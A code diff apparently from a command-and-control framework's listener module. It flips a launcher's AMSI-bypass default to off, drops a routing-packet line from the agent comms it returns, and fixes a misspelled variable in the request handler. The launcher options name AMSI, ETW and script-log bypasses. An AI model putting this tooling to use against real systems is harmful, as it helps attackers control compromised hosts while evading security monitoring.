@@ -240,7 +240,7 @@ class Listener(object):
 
 
     def generate_launcher(self, encode=True, obfuscate=False, obfuscationCommand="", userAgent='default', proxy='default', proxyCreds='default', stagerRetries='0', language=None, safeChecks='', listenerName=None,
-                          stager=None, scriptLogBypass=None, AMSIBypass=True, AMSIBypass2=False, ETWBypass=False):
+                          stager=None, scriptLogBypass=None, AMSIBypass=False, AMSIBypass2=False, ETWBypass=False):
         """
         Generate a basic launcher for the specified listener.
         """
@@ -905,7 +905,7 @@ class Listener(object):
                 sendMessage += "}"
                 sendMessage += "};"
 
-                return updateServers + getTask + sendMessage + "\n'New agent comms registered!'" + "\n $routingpacket;"
+                return updateServers + getTask + sendMessage + "\n'New agent comms registered!'"
 
             elif language.lower() == 'python':
                 # Python
@@ -1072,7 +1072,7 @@ class Listener(object):
 
         @app.route('/', methods=["GET", "POST"])
         @app.route('/<path:request_uri>', methods=["GET", "POST"])
-        def handle_request(request_uri="", tempLIstenerOptions=None):
+        def handle_request(request_uri="", tempListenerOptions=None):
             """
             Handle an agent request.
             """
@@ -1176,7 +1176,7 @@ class Listener(object):
                                                 try:
                                                     hopListener = helpers.get_listener_options(hopListenerName)
                                                     tempListenerOptions = copy.deepcopy(listenerOptions)
-                                                    tempLIstenerOptions['Host']['Value'] = hopListener['Host']['Value']
+                                                    tempListenerOptions['Host']['Value'] = hopListener['Host']['Value']
                                                 except TypeError:
                                                     tempListenerOptions = listenerOptions
 
